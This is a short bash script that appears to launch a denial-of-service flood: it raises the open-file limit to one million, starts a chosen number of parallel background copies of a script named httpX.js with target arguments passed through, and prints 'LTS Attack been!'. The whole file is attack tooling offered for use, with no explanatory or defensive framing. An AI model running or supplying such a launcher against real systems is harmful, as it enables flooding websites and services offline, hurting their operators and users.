#!/bin/bash
ulimit -n 1000000


for i in $(seq 1 $1) 
do
node httpX.js $2 $3 $4 $5 $6&
done
echo "LTS Attack been!"
exit